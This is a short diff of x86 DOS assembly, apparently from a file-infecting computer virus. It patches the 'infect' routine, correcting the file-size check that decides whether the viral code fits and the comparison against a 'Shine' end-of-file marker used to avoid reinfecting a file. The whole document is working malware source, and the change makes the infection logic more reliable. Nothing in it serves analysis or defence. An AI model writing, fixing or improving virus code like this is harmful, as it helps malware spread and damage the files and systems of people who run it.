@@ -133,7 +133,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      int 21h          ; Calling int 21h
      pop bx
      cmp ax, 65436-virus_size   ; I the file too big??
-     je .abort_infection
+     jae .abort_infection
      push bx          ; Nope, perfetto sizo. BX = File handle
 
      mov ax, 3f00h    ; Read file or device
@@ -153,7 +153,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      add di, 5
      mov cx, 5
      rep cmpsb       ; Is EOF = 'Shine'?
-     je .abort_infection  ; Yes, abort infection
+     jz .abort_infection  ; Yes, abort infection
      push bx         ; Nope, let's infect this bad boy             
      pop bx
 
